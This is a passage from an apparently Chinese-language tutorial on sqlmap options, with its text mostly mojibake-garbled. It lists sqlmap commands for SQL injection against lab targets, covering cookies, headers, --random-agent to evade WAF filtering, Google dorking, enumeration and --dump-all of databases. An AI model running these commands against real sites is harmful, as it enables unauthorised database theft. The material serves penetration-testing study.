</ul>
</li>
<li>Kalié›†æˆç‰ˆéšKaliåº“æ›´æ–°ï¼ˆKali rollingç‰ˆæœ¬å¯ä»¥ç›´æ¥é€šè¿‡updateã€upgradeï¼‰</li>
</ul>
<blockquote>
<pre><code>â­Kalié›†æˆç‰ˆæ›´æ–°ï¼ˆâ–² 2020.1.15 æ›´æ–°å¯èƒ½åœ¨bashä¸­æ‰¾ä¸åˆ°sqlmapï¼‰
1.git clone https://github.com/sqlmapproject/sqlmap.git sqlmap-dev
2.sqlmap --update</code></pre></blockquote>
<h4 id="5-SQLMAPâ€“Options-Targetå‚æ•°"><a href="#5-SQLMAPâ€“Options-Targetå‚æ•°" class="headerlink" title="5. SQLMAPâ€“Options/Targetå‚æ•°"></a>5. SQLMAPâ€“Options/Targetå‚æ•°</h4><ul>
<li>Options<ul>
<li>-hï¼ˆæ˜¾ç¤ºç²—ç•¥ä¿¡æ¯)</li>
<li>-hhï¼ˆæ˜¾ç¤ºè¯¦ç»†ä¿¡æ¯ï¼‰</li>
<li>â€“versionï¼ˆSQLMAPç‰ˆæœ¬ä¿¡æ¯ï¼‰</li>
<li>-v ï¼ˆç‰ˆæœ¬ä¿¡æ¯ï¼Œåˆ†ä¸º0-5çº§ï¼Œé»˜è®¤ä¸º1çº§ï¼‰</li>
</ul>
</li>
<li>Target<ul>
<li>-dï¼ˆç›´æ¥è¿æ¥ï¼Œä½œä¸ºæ•°æ®åº“çš„å®¢æˆ·ç«¯ï¼‰</li>
<li>-uï¼ˆURLåœ°å€ï¼Œéœ€è¦æœ‰å˜é‡åç§°ï¼‰</li>
<li>-lï¼ˆlog fileè®°å½•æ—¥å¿—ï¼Œå¯ä»¥æ¥è‡ªBurp or webscarabï¼‰</li>
<li>-xï¼ˆç«™ç‚¹åœ°å›¾ï¼Œå¯ä»¥æäº¤ä»¥xmlæ–‡ä»¶çš„å½¢å¼ï¼‰</li>
<li>-mï¼ˆurlåœ°å€è¡¨ï¼Œå¤šä¸ªurlåœ°å€ä¿å­˜ä¸ºæ–‡æœ¬æ–‡ä»¶ï¼‰</li>
<li>-rï¼ˆhttpå¤´è¯·æ±‚ä¿¡æ¯æäº¤ï¼Œä¿å­˜httpå¤´è¯·æ±‚ä¿¡æ¯ï¼‰</li>
<li>-gï¼ˆGoogleæœç´¢å¼•æ“ï¼Œæ­£åˆ™è¡¨è¾¾å¼ï¼‰</li>
<li>-cï¼ˆé…ç½®æ–‡ä»¶ï¼Œä¿å­˜æ‰«æçš„é…ç½®æ–‡ä»¶ï¼‰</li>
</ul>
</li>
</ul>
<h4 id="6-SQLMAPâ€“Target-â†’-ç›´æ¥è¿æ¥"><a href="#6-SQLMAPâ€“Target-â†’-ç›´æ¥è¿æ¥" class="headerlink" title="6. SQLMAPâ€“Target â†’ ç›´æ¥è¿æ¥"></a>6. SQLMAPâ€“Target â†’ ç›´æ¥è¿æ¥</h4><ul>
<li>ç›´æ¥æ–¹æ³•<ul>
<li>sqlmap -d â€œmysql://user:<a href="mailto:password@192.168.1.1" target="_blank" rel="noopener">password@192.168.1.1</a>:3306/dvwaâ€</li>
<li>â€“usersï¼ˆæ•°æ®åº“çš„ç®¡ç†è´¦å·ï¼‰</li>
<li>â€“bannerï¼ˆç›®æ ‡ç³»ç»Ÿç‰ˆæœ¬ï¼Œæ•°æ®åº“ç±»å‹ç‰ˆæœ¬ï¼‰</li>
<li>â€“dbsï¼ˆæŸ¥è¯¢ç›®æ ‡æ•°æ®åº“ç®¡ç†ç³»ç»Ÿçš„åº“ï¼‰</li>
<li>â€“schemaï¼ˆæºæ•°æ®åº“ï¼‰</li>
<li>-aï¼ˆæ‰€æœ‰æ•°æ®ä¿¡æ¯ï¼‰</li>
</ul>
</li>
</ul>
<blockquote>
<pre><code>â­æŸ¥è¯¢ç»“æœï¼Œé»˜è®¤ä¿å­˜åœ¨ï¼š/root/.sqlmap/output/ä¸­</code></pre></blockquote>
<h4 id="7-SQLMAPâ€“Target-â†’-Getæ–¹æ³•"><a href="#7-SQLMAPâ€“Target-â†’-Getæ–¹æ³•" class="headerlink" title="7. SQLMAPâ€“Target â†’ Getæ–¹æ³•"></a>7. SQLMAPâ€“Target â†’ Getæ–¹æ³•</h4><ul>
<li>Getæ–¹æ³•<ul>
<li>sqlmap -u â€œ<a href="http://1.1.1.1/mutillidae/index.php?page=user-info.php&amp;username=1&amp;password=22&amp;user-info-php-submit-button=View+Account+Datails&quot;" target="_blank" rel="noopener">http://1.1.1.1/mutillidae/index.php?page=user-info.php&amp;username=1&amp;password=22&amp;user-info-php-submit-button=View+Account+Datails&quot;</a> -pï¼ˆåªæ£€æŸ¥ï¼‰ username -fï¼ˆæ•°æ®åº“çš„æŒ‡çº¹ï¼‰</li>
<li><ul>
<li>â€“usersï¼ˆæ•°æ®åº“çš„ç®¡ç†è´¦å·ï¼‰</li>
</ul>
</li>
<li>â€“bannerï¼ˆç›®æ ‡ç³»ç»Ÿç‰ˆæœ¬ï¼Œæ•°æ®åº“ç±»å‹ç‰ˆæœ¬ï¼‰</li>
<li>â€“dbsï¼ˆæŸ¥è¯¢ç›®æ ‡æ•°æ®åº“ç®¡ç†ç³»ç»Ÿçš„åº“ï¼‰</li>
<li>â€“schemaï¼ˆæºæ•°æ®åº“ï¼‰</li>
<li>-aï¼ˆæ‰€æœ‰æ•°æ®ä¿¡æ¯ï¼‰</li>
</ul>
</li>
</ul>
<h4 id="8-SQLMAPâ€“Target-â†’-æ‰«æURLåˆ—è¡¨æ–‡ä»¶"><a href="#8-SQLMAPâ€“Target-â†’-æ‰«æURLåˆ—è¡¨æ–‡ä»¶" class="headerlink" title="8. SQLMAPâ€“Target â†’ æ‰«æURLåˆ—è¡¨æ–‡ä»¶"></a>8. SQLMAPâ€“Target â†’ æ‰«æURLåˆ—è¡¨æ–‡ä»¶</h4><ul>
<li>æ‰«æURLåˆ—è¡¨æ–‡ä»¶<ul>
<li><a href="http://1.1.1.1/vuln1.php?q=foobar" target="_blank" rel="noopener">http://1.1.1.1/vuln1.php?q=foobar</a></li>
<li><a href="http://1.1.1.1/vuln3/id/1" target="_blank" rel="noopener">http://1.1.1.1/vuln3/id/1</a>*</li>
<li>sqlmap -m list.txt</li>
</ul>
</li>
</ul>
<h4 id="9-SQLMAPâ€“Target-â†’-æ‰«æGoogleæœç´¢ç»“æœ"><a href="#9-SQLMAPâ€“Target-â†’-æ‰«æGoogleæœç´¢ç»“æœ" class="headerlink" title="9. SQLMAPâ€“Target â†’ æ‰«æGoogleæœç´¢ç»“æœ"></a>9. SQLMAPâ€“Target â†’ æ‰«æGoogleæœç´¢ç»“æœ</h4><ul>
<li>æ‰«æGoogleæœç´¢ç»“æœï¼ˆéœ€è¦ä»£ç†é“¾ï¼Œé…ç½®æ‰èƒ½ä½¿ç”¨ï¼‰<ul>
<li>sqlmap.py -g â€œinurl:&quot;.php?id=1&quot;â€œ</li>
</ul>
</li>
</ul>
<h4 id="10-SQLMAPâ€“Target-â†’-POSTæ–¹æ³•"><a href="#10-SQLMAPâ€“Target-â†’-POSTæ–¹æ³•" class="headerlink" title="10. SQLMAPâ€“Target â†’ POSTæ–¹æ³•"></a>10. SQLMAPâ€“Target â†’ POSTæ–¹æ³•</h4><ul>
<li>ä½¿ç”¨httpè¯·æ±‚æ–‡ä»¶ï¼ˆburpsuiteï¼‰<ul>
<li>ä½¿ç”¨Burpï¼Œè®¾ç½®æµè§ˆå™¨ä»£ç†ï¼ŒPOSTæäº¤æ•°æ®çš„ç™»å½•å½¢å¼</li>
<li>å¤åˆ¶httpè¯·æ±‚å¤´ï¼Œgedité»è´´åœ¨æ–°å»ºrequest.txtä¸­</li>
<li>sqlmap -r request.txtï¼ˆé€šè¿‡BurpæŠ“å–è¯·æ±‚çš„æ–‡ä»¶ï¼‰</li>
</ul>
</li>
<li>ä½¿ç”¨burpsuite logæ–‡ä»¶<ul>
<li>Options â†’ Misc â†’ Project Logging â†’ Proxy Requests</li>
<li>ä¿å­˜ä¸ºlog.txtï¼Œå‘é€Httpè¯·æ±‚ï¼ˆå…³é—­Interceptï¼‰</li>
<li>sqlmap -l log.txt</li>
</ul>
</li>
</ul>
<h4 id="11-SQLMAPâ€“Target-â†’-HTTPS"><a href="#11-SQLMAPâ€“Target-â†’-HTTPS" class="headerlink" title="11. SQLMAPâ€“Target â†’ HTTPS"></a>11. SQLMAPâ€“Target â†’ HTTPS</h4><ul>
<li>sqlmap -u â€œ<a href="https://1.1.1.1/a.php?id=1:8843&quot;" target="_blank" rel="noopener">https://1.1.1.1/a.php?id=1:8843&quot;</a> â€“force-ssl</li>
</ul>
<h4 id="12-SQLMAPâ€“Target-â†’-æ‰«æé…ç½®æ–‡ä»¶"><a href="#12-SQLMAPâ€“Target-â†’-æ‰«æé…ç½®æ–‡ä»¶" class="headerlink" title="12. SQLMAPâ€“Target â†’ æ‰«æé…ç½®æ–‡ä»¶"></a>12. SQLMAPâ€“Target â†’ æ‰«æé…ç½®æ–‡ä»¶</h4><ul>
<li>æŸ¥æ‰¾sqlmap.confï¼ˆ/etc/sqlmap/sqlmap.confï¼‰</li>
<li>sqlmap -c sqlmap.conf</li>
</ul>
<h4 id="13-SQLMAPâ€“REQUEST-â†’-æ•°æ®æ®µ"><a href="#13-SQLMAPâ€“REQUEST-â†’-æ•°æ®æ®µ" class="headerlink" title="13. SQLMAPâ€“REQUEST â†’ æ•°æ®æ®µ"></a>13. SQLMAPâ€“REQUEST â†’ æ•°æ®æ®µ</h4><ul>
<li>æ•°æ®æ®µï¼š â€“data<ul>
<li>get/postéƒ½é€‚ç”¨</li>
<li>sqlmap -u â€œ<a href="http://1.1.1.1/a.php&quot;" target="_blank" rel="noopener">http://1.1.1.1/a.php&quot;</a> â€“data=â€user=1&amp;pass=2ï¼ˆgetçš„urlå‚æ•°éƒ¨åˆ†/postçš„æºä»£ç ï¼‰â€ -f</li>
</ul>
</li>
</ul>
<h4 id="14-SQLMAPâ€“REQUEST-â†’-å˜é‡åˆ†éš”ç¬¦"><a href="#14-SQLMAPâ€“REQUEST-â†’-å˜é‡åˆ†éš”ç¬¦" class="headerlink" title="14. SQLMAPâ€“REQUEST â†’ å˜é‡åˆ†éš”ç¬¦"></a>14. SQLMAPâ€“REQUEST â†’ å˜é‡åˆ†éš”ç¬¦</h4><ul>
<li>å˜é‡åˆ†éš”ç¬¦ï¼š â€“param-del<ul>
<li><a href="http://1.1.1.1/a.php?q=foo;id=1" target="_blank" rel="noopener">http://1.1.1.1/a.php?q=foo;id=1</a>  //  ;  &amp;</li>
<li>sqlmap -u â€œ<a href="http://1.1.1.1/a.php&quot;" target="_blank" rel="noopener">http://1.1.1.1/a.php&quot;</a> â€“data=â€q=foo;id=1â€ â€“param-del=â€;â€ -f</li>
</ul>
</li>
</ul>
<h4 id="15-SQLMAPâ€“REQUEST-â†’-Cookieå¤´"><a href="#15-SQLMAPâ€“REQUEST-â†’-Cookieå¤´" class="headerlink" title="15.SQLMAPâ€“REQUEST â†’ Cookieå¤´"></a>15.SQLMAPâ€“REQUEST â†’ Cookieå¤´</h4><ul>
<li>â€“cookie</li>
<li>sqlmap -u â€œ<a href="http://1.1.1.1/a.php?id=12&quot;" target="_blank" rel="noopener">http://1.1.1.1/a.php?id=12&quot;</a> â€“cookie=â€a=1ï¼›b=2ï¼ˆCookeçš„å€¼ï¼‰â€ -f </li>
<li>webåº”ç”¨éœ€è¦åŸºäºcookieçš„èº«ä»½è®¤è¯</li>
<li>æ£€æŸ¥å­˜åœ¨cookieä¸­çš„æ³¨å…¥ç‚¹ï¼ˆsqlmapè‡ªåŠ¨æµ‹è¯•ï¼‰</li>
<li>Set-Cookie/â€“drop-set-cookie</li>
</ul>
<blockquote>
<pre><code>â­SQLMAPæ‰«æçš„Level1ä¸ä¼šæ‰«æcookieä¸­å­˜åœ¨çš„æ¼æ´ï¼Œè‡³å°‘å¾—ä»Level2å¼€å§‹ï¼Œ--level 2</code></pre></blockquote>
<h4 id="16-SQLMAPâ€“REQUEST-â†’-Agent"><a href="#16-SQLMAPâ€“REQUEST-â†’-Agent" class="headerlink" title="16. SQLMAPâ€“REQUEST â†’ Agent"></a>16. SQLMAPâ€“REQUEST â†’ Agent</h4><ul>
<li>â€“user-agent<ul>
<li>sqlmap/1.0-dev-xxxxxxxx(<a href="http://sqlmap.org" target="_blank" rel="noopener">http://sqlmap.org</a>)</li>
<li>sqlmap -u â€œ<a href="http://1.1.1.1/a.php?id=123&quot;" target="_blank" rel="noopener">http://1.1.1.1/a.php?id=123&quot;</a> â€“user-agent=â€aaaaaaâ€ â€“dbs</li>
</ul>
</li>
<li>â€“random-agent<ul>
<li>/usr/share/sqlmap/txt/yser-agents.txt</li>
<li>sqlmap -u â€œ<a href="http://1.1.1.1/a.php?id=123&quot;" target="_blank" rel="noopener">http://1.1.1.1/a.php?id=123&quot;</a> â€“random-agent â€“dbs</li>
</ul>
</li>
<li>sqlmapæ£€æŸ¥user-agentä¸­çš„æ³¨å…¥ç‚¹ï¼šLevel&gt;=3</li>
<li>APP/WAF/IPS/IDSè¿‡æ»¤å¼‚å¸¸user-agentæ—¶æŠ¥é”™<ul>
<li>[hh:mm:20][ERROR] the target URL responded with an unknown HTTP status code,try to force the HTTP User-Agent header with option â€“useragent or â€“random-agent</li>
</ul>
</li>
</ul>
<h4 id="17-SQLMAPâ€“REQUEST-â†’-Host-Referer-é¢å¤–çš„header"><a href="#17-SQLMAPâ€“REQUEST-â†’-Host-Referer-é¢å¤–çš„header" class="headerlink" title="17. SQLMAPâ€“REQUEST â†’ Host/Referer/é¢å¤–çš„header"></a>17. SQLMAPâ€“REQUEST â†’ Host/Referer/é¢å¤–çš„header</h4><ul>
<li>Hostå¤´ï¼šâ€“host<ul>
<li>Level=5</li>
</ul>
</li>
<li>Refererå¤´ï¼šâ€“referer<ul>
<li>Level&gt;=3</li>
</ul>
</li>
<li>é¢å¤–çš„headerï¼šâ€“headers<ul>
<li>æ¯ä¸ªå¤´å•ç‹¬ä¸€è¡Œï¼ˆåç§°åŒºåˆ†å¤§å°å†™ï¼Œå¤§å°å†™æ•æ„Ÿï¼‰</li>
<li>sqlmap -u â€œ<a href="http://1.1.1.1/a.php?id=123&quot;" target="_blank" rel="noopener">http://1.1.1.1/a.php?id=123&quot;</a> â€“headers=â€Host:<a href="http://www.a.com\nUser-Agent:yuanfh&quot;" target="_blank" rel="noopener">www.a.com\nUser-Agent:yuanfh&quot;</a></li>
</ul>
</li>
<li>â€“method=GET/POSTï¼ˆå‘é€è¯·æ±‚çš„æ–¹æ³•ï¼ŒæŒ‡å®šè¯·æ±‚æ–¹æ³•ï¼‰</li>
</ul>
<h4 id="18-SQLMAPâ€“REQUEST-â†’-åŸºäºHTTPåè®®çš„èº«ä»½éªŒè¯"><a href="#18-SQLMAPâ€“REQUEST-â†’-åŸºäºHTTPåè®®çš„èº«ä»½éªŒè¯" class="headerlink" title="18. SQLMAPâ€“REQUEST â†’ åŸºäºHTTPåè®®çš„èº«ä»½éªŒè¯"></a>18. SQLMAPâ€“REQUEST â†’ åŸºäºHTTPåè®®çš„èº«ä»½éªŒè¯</h4><ul>
<li>åŸºäºHTTPåè®®çš„èº«ä»½éªŒè¯<ul>
<li>Basic</li>
<li>Digest</li>
<li>NTLM</li>
<li>sqlmap -u â€œ<a href="http://1.1.1.1/a.php?id=1&quot;" target="_blank" rel="noopener">http://1.1.1.1/a.php?id=1&quot;</a> â€“auth-type Basic â€“auth-cred â€œuser:passâ€</li>
</ul>
</li>
<li>â€“auth-cert/â€“auth-fileï¼ˆåŸºäºå®¢æˆ·ç«¯è¯ä¹¦çš„èº«ä»½è®¤è¯ï¼‰<ul>
<li>â€“auth-file=â€ca.PEMâ€</li>
<li>å«æœ‰ç§é’¥çš„PEMæ ¼å¼è¯ä¹¦æ–‡ä»¶</li>
<li>PEMæ ¼å¼çš„è¯ä¹¦é“¾æ–‡ä»¶</li>
</ul>
</li>
</ul>
<h4 id="19-SQLMAPâ€“REQUEST-â†’-http-s-ä»£ç†"><a href="#19-SQLMAPâ€“REQUEST-â†’-http-s-ä»£ç†" class="headerlink" title="19. SQLMAPâ€“REQUEST â†’ http(s)ä»£ç†"></a>19. SQLMAPâ€“REQUEST â†’ http(s)ä»£ç†</h4><ul>
<li>http(s)ä»£ç†ï¼ˆæœç´¢å¼•èµ·ï¼šinurl:.php?id=ï¼‰<ul>
<li>â€“proxy=â€<a href="http://127.0.0.1:8087&quot;" target="_blank" rel="noopener">http://127.0.0.1:8087&quot;</a></li>
<li>â€“proxy=â€socks5://127.0.0.1:8087â€</li>
<li>â€“proxy-cred=â€name:passâ€ï¼ˆä»£ç†çš„èº«ä»½è®¤è¯ï¼‰</li>
<li>â€“ignore-proxyï¼ˆå¿½ç•¥ç³»ç»Ÿçº§ä»£ç†è®¾ç½®ï¼Œé€šå¸¸ç”¨äºæ‰«ææœ¬åœ°ç½‘ç»œç›®æ ‡ï¼‰</li>
</ul>
</li>
<li>sqlmap -u â€œ<a href="http://1.1.1.1/a.php?id=1&quot;" target="_blank" rel="noopener">http://1.1.1.1/a.php?id=1&quot;</a> â€“proxy=â€<a href="http://127.0.0.1:8087&quot;" target="_blank" rel="noopener">http://127.0.0.1:8087&quot;</a> -f</li>
</ul>
<h4 id="20-SQLMAPâ€“REQUEST-â†’-delay-timeout-retries-randomize"><a href="#20-SQLMAPâ€“REQUEST-â†’-delay-timeout-retries-randomize" class="headerlink" title="20. SQLMAPâ€“REQUEST â†’ delay/timeout/retries/randomize"></a>20. SQLMAPâ€“REQUEST â†’ delay/timeout/retries/randomize</h4><ul>
<li>â€“delay<ul>
<li>æ¯æ¬¡http(s)è¯·æ±‚ä¹‹é—´çš„å»¶è¿Ÿæ—¶é—´ï¼Œæµ®ç‚¹æ•°ï¼Œå•ä½ä¸ºç§’ï¼Œé»˜è®¤æ— å»¶è¿Ÿ</li>
</ul>
</li>
<li>â€“timeout<ul>
<li>è¯·æ±‚è¶…æ—¶æ—¶é—´ï¼Œæµ®ç‚¹æ•°ï¼Œé»˜è®¤ä¸º30ç§’</li>
</ul>
</li>
<li>â€“retries<ul>
<li>http(s)è¿æ¥è¶…æ—¶é‡è¯•æ¬¡æ•°ï¼Œé»˜è®¤ä¸º3ç§’</li>
</ul>
</li>
<li>â€“randomize<ul>
<li>é•¿åº¦ã€ç±»å‹ä¸åŸå§‹å€¼ä¿æŒä¸€è‡´çš„å‰æä¸‹ï¼ŒæŒ‡å®šæ¯æ¬¡è¯·æ±‚éšæœºå–å€¼çš„å‚æ•°å</li>
<li>sqlmap -u â€œ<a href="http://1.1.1.1/a.php?id=100&quot;" target="_blank" rel="noopener">http://1.1.1.1/a.php?id=100&quot;</a> â€“randomize=â€idâ€</li>
</ul>
</li>
</ul>
<h4 id="21-SQLMAPâ€“REQUEST-â†’-scope-safe"><a href="#21-SQLMAPâ€“REQUEST-â†’-scope-safe" class="headerlink" title="21. SQLMAPâ€“REQUEST â†’ scope/safe"></a>21. SQLMAPâ€“REQUEST â†’ scope/safe</h4><ul>
<li>â€“scope<ul>
<li>è¿‡æ»¤æ—¥å¿—å†…å®¹ï¼Œé€šè¿‡æ­£åˆ™è¡¨è¾¾å¼ç­›é€‰æ‰«æå¯¹è±¡</li>
<li>sqlmap -l burp.log â€“scope=â€(www)?.target.(com|net|org)â€</li>
<li>sqlmap -l 2.log â€“scope=â€(19)?.168.20.(1|10|100)â€ â€“level 3 â€“dbs</li>
<li>â–² User-agentä¸­çš„æ³¨å…¥ç‚¹</li>
</ul>
</li>
<li>â€“safe-url/â€“safe-freqï¼ˆä¸¤ä¸ªéœ€åŒæ—¶ä½¿ç”¨ï¼‰<ul>
<li>æ£€æµ‹å’Œç›²æ³¨é˜¶æ®µä¼šäº§ç”Ÿå¤§é‡å¤±è´¥è¯·æ±‚ï¼ŒæœåŠ¡å™¨ç«¯å¯èƒ½å› æ­¤é”€æ¯Session</li>
<li>æ¯å‘é€â€“safe-freqæ¬¡æ³¨å…¥è¯·æ±‚åï¼Œå‘é€ä¸€æ¬¡æ­£å¸¸è¯·æ±‚</li>
</ul>
</li>
</ul>
<h4 id="22-SQLMAPâ€“REQUEST-â†’-skip-urlencode-eval"><a href="#22-SQLMAPâ€“REQUEST-â†’-skip-urlencode-eval" class="headerlink" title="22. SQLMAPâ€“REQUEST â†’ skip-urlencode/eval"></a>22. SQLMAPâ€“REQUEST â†’ skip-urlencode/eval</h4><ul>
<li>â€“skip-urlencode<ul>
<li>é»˜è®¤Getæ–¹æ³•ä¼šå¯¹ä¼ è¾“å†…å®¹è¿›è¡Œç¼–ç ï¼ŒæŸäº›WEBæœåŠ¡å™¨ä¸éµå®ˆRFCæ ‡å‡†ç¼–ç ï¼Œä½¿ç”¨åŸå§‹å­—ç¬¦æäº¤æ•°æ®</li>
</ul>
</li>
<li>â€“eval<ul>
<li>æ¯æ¬¡è¯·æ±‚å‰æ‰§è¡ŒæŒ‡å®šçš„pythonä»£ç </li>
<li>æ¯æ¬¡è¯·æ±‚æ›´æ”¹æˆ–å¢åŠ æ–°çš„å‚æ•°å€¼ï¼ˆæ—¶é—´ä¾èµ–ã€å…¶ä»–å‚æ•°å€¼ä¾èµ–ï¼‰</li>
<li>sqlmap -u â€œ<a href="http://1.1.1.1/a.php?id=1&amp;hash=&quot;=c4ca4238a0b923820dcc509a6f75849b&quot;" target="_blank" rel="noopener">http://1.1.1.1/a.php?id=1&amp;hash=&quot;=c4ca4238a0b923820dcc509a6f75849b&quot;</a> â€“eval=â€import hashlib;hash=hashlib.md5(id).hexdigest()â€</li>
</ul>
</li>
</ul>
<h4 id="23-SQLMAPâ€“Optimizationå‚æ•°ï¼ˆæ€§èƒ½ä¼˜åŒ–ï¼‰"><a href="#23-SQLMAPâ€“Optimizationå‚æ•°ï¼ˆæ€§èƒ½ä¼˜åŒ–ï¼‰" class="headerlink" title="23. SQLMAPâ€“Optimizationå‚æ•°ï¼ˆæ€§èƒ½ä¼˜åŒ–ï¼‰"></a>23. SQLMAPâ€“Optimizationå‚æ•°ï¼ˆæ€§èƒ½ä¼˜åŒ–ï¼‰</h4><ul>
<li>-oï¼ˆå¼€å¯æ‰€æœ‰å‚æ•°çš„ä¼˜åŒ–ï¼Œé™¤threadså‚æ•°å¤–ï¼‰</li>
<li>â€“predict-output</li>
<li>â€“keep-alive</li>
<li>â€“null-connection</li>
<li>â€“threads=THREADS</li>
</ul>
<h4 id="24-SQLMAPâ€“Optimization-â†’-predict-output"><a href="#24-SQLMAPâ€“Optimization-â†’-predict-output" class="headerlink" title="24. SQLMAPâ€“Optimization â†’ predict-output"></a>24. SQLMAPâ€“Optimization â†’ predict-output</h4><ul>
<li>æ ¹æ®æ£€æµ‹æ–¹æ³•ï¼Œæ¯”å¯¹è¿”å›å€¼å’Œç»Ÿè®¡è¡¨å†…å®¹ï¼Œä¸æ–­ç¼©å°æ£€æµ‹èŒƒå›´ï¼Œæé«˜æ£€æµ‹æ•ˆç‡</li>
<li>ç‰ˆæœ¬åã€ç”¨æˆ·åã€å¯†ç ã€Privilegesã€roleã€æ•°æ®åº“åç§°ã€è¡¨åã€åˆ—å</li>
<li>â–² ä¸â€“threadså‚æ•°ä¸å…¼å®¹</li>
<li>ç»Ÿè®¡è¡¨ï¼š/usr/share/sqlmap/txt/common-outputs.txt</li>
</ul>
<h4 id="25-SQLMAPâ€“Optimization-â†’-Keep-alive"><a href="#25-SQLMAPâ€“Optimization-â†’-Keep-alive" class="headerlink" title="25. SQLMAPâ€“Optimization â†’ Keep alive"></a>25. SQLMAPâ€“Optimization â†’ Keep alive</h4><ul>
<li>â€“keep alive</li>
<li>ä½¿ç”¨http(s)é•¿è¿æ¥ï¼Œæ€§èƒ½å¥½</li>
<li>â–² ä¸â€“proxyå‚æ•°ä¸å…¼å®¹</li>
<li>é•¿è¿æ¥é¿å…é‡å¤å»ºç«‹è¿æ¥çš„ç½‘ç»œå¼€é”€ï¼Œä½†å¤§é‡é•¿è¿æ¥ä¼šä¸¥é‡å ç”¨æœåŠ¡å™¨èµ„æº</li>
</ul>
<h4 id="26-SQLMAPâ€“Optimization-â†’-null-connection"><a href="#26-SQLMAPâ€“Optimization-â†’-null-connection" class="headerlink" title="26. SQLMAPâ€“Optimization â†’ null-connection"></a>26. SQLMAPâ€“Optimization â†’ null-connection</h4><ul>
<li>â€“null-connection</li>
<li>åªè·å–ç›¸åº”é¡µé¢çš„å¤§å°å€¼ï¼Œè€Œéé¡µé¢å…·ä½“å†…å®¹</li>
<li>é€šå¸¸ç”¨äºç›²æ³¨åˆ¤æ–­çœŸ/å‡ï¼Œé™ä½ç½‘ç»œå¸¦å®½æ¶ˆè€—</li>
<li>â–² ä¸â€“text-onlyå‚æ•°ä¸å…¼å®¹ï¼ˆåŸºäºé¡µé¢å†…å®¹çš„æ¯”è¾ƒåˆ¤æ–­çœŸ/å‡ï¼‰</li>
</ul>
<h4 id="27-SQLMAPâ€“Optimization-â†’-threads"><a href="#27-SQLMAPâ€“Optimization-â†’-threads" class="headerlink" title="27. SQLMAPâ€“Optimization â†’ threads"></a>27. SQLMAPâ€“Optimization â†’ threads</h4><ul>
<li>â€“threads=THREADS</li>
<li>æœ€å¤§å¹¶å‘çº¿ç¨‹</li>
<li>ç›²æ³¨æ—¶æ¯ä¸ªçº¿ç¨‹è·å–ä¸€ä¸ªå­—ç¬¦ï¼ˆæ¯ä¸ªçº¿ç¨‹7æ¬¡è¯·æ±‚ï¼‰ï¼Œè·å–å®Œæˆåçº¿ç¨‹ç»“æŸ</li>
<li>é»˜è®¤å€¼ä¸º1ï¼Œå»ºè®®ä¸è¦è¶…è¿‡10ï¼Œå¦åˆ™å¯èƒ½å½±å“ç›®æ ‡ç«™ç‚¹å¯ç”¨æ€§</li>
<li>â–² ä¸â€“predict-outputå‚æ•°ä¸å…¼å®¹</li>
</ul>
<blockquote>
<pre><code>â­7æ¬¡è¯·æ±‚å³å¯ä»¥è·å–åˆ°ä¸€ä¸ªASCIIç å­—ç¬¦ï¼Œå³å¯æ‰“å°å­—ç¬¦ä¸º128ä¸ª</code></pre></blockquote>
<h4 id="28-SQLMAPâ€“ENUMERATION-â†’-æšä¸¾æ•°æ®åº“æ•°æ®"><a href="#28-SQLMAPâ€“ENUMERATION-â†’-æšä¸¾æ•°æ®åº“æ•°æ®" class="headerlink" title="28. SQLMAPâ€“ENUMERATION â†’ æšä¸¾æ•°æ®åº“æ•°æ®"></a>28. SQLMAPâ€“ENUMERATION â†’ æšä¸¾æ•°æ®åº“æ•°æ®</h4><ul>
<li>â€“current-userï¼ˆå½“å‰æ•°æ®åº“ç®¡ç†ç³»ç»Ÿè´¦å·ï¼‰</li>
<li>â€“current-dbï¼ˆå½“å‰æ•°æ®åº“ç®¡ç†ç³»ç»Ÿçš„æ•°æ®åº“ï¼‰</li>
<li>â€“hostnameï¼ˆå½“å‰æœºå™¨ä¸»æœºåï¼‰</li>
<li>â€“usersï¼ˆæ•°æ®åº“ç®¡ç†ç³»ç»Ÿæ‰€æœ‰è´¦å·ï¼‰</li>
<li>â€“privileges -U usernameï¼ˆCUå½“å‰è´¦å·ï¼‰</li>
<li>â€“rolesï¼ˆæ•°æ®åº“è§’è‰²ï¼‰</li>
<li>â€“dbsï¼ˆæ•°æ®åº“ç®¡ç†ç³»ç»Ÿæ‰€æœ‰çš„æ•°æ®åº“ï¼‰</li>
<li>â€“tablesã€â€“columsã€â€“exclude-sysdbsï¼ˆæ’é™¤ç³»ç»Ÿåº“ï¼‰</li>
<li>-D dbï¼ˆæŒ‡å®šæ‰€ä½¿ç”¨çš„æ•°æ®åº“ï¼‰</li>
<li>-T tableï¼ˆæŒ‡å®šæ‰€ä½¿ç”¨çš„æ•°æ®è¡¨ï¼‰</li>
<li>-C user â€“colusmsï¼ˆæŒ‡å®šæŸä¸ªåˆ—ï¼‰</li>
<li>â€“schemaï¼ˆè¡¨ç»“æ„ï¼‰â€“batchï¼ˆæ‰¹å¤„ç†ï¼‰ â€“exclude-sysdbs å…ƒæ•°æ®ï¼ˆä½¿ç”¨é»˜è®¤é€‰é¡¹ï¼‰</li>
<li>â€“countï¼ˆè¡¨çš„è¡Œæ•°ï¼‰</li>
</ul>
<h4 id="29-SQLMAPâ€“ENUMERATION-â†’-å…·ä½“æ•°æ®æ“ä½œ"><a href="#29-SQLMAPâ€“ENUMERATION-â†’-å…·ä½“æ•°æ®æ“ä½œ" class="headerlink" title="29. SQLMAPâ€“ENUMERATION â†’ å…·ä½“æ•°æ®æ“ä½œ"></a>29. SQLMAPâ€“ENUMERATION â†’ å…·ä½“æ•°æ®æ“ä½œ</h4><ul>
<li>Dumpæ•°æ®<ul>
<li>â€“dump,-C,-T,-D,â€“start,â€“stop</li>
<li>â€“dump-all â€“exclude-sysdbs</li>
<li>â€“sql-query â€œselect * from usersâ€</li>
</ul>
</li>
</ul>
<h4 id="30-SQLMAPâ€“BRUFE-FORCEï¼ˆæš´åŠ›ç ´è§£ï¼‰"><a href="#30-SQLMAPâ€“BRUFE-FORCEï¼ˆæš´åŠ›ç ´è§£ï¼‰" class="headerlink" title="30. SQLMAPâ€“BRUFE FORCEï¼ˆæš´åŠ›ç ´è§£ï¼‰"></a>30. SQLMAPâ€“BRUFE FORCEï¼ˆæš´åŠ›ç ´è§£ï¼‰</h4><ul>
<li>Mysql&lt;5.0ï¼Œæ²¡æœ‰information_schemaåº“</li>
<li>Mysql&gt;=5.0ï¼Œä½†æ— æƒè¯»å–information_schemaåº“</li>
<li>å¾®è½¯çš„accessæ•°æ®åº“ï¼Œé»˜è®¤æ— æƒè¯»å–MSysObjectsåº“</li>
<li>â€“common-tables</li>
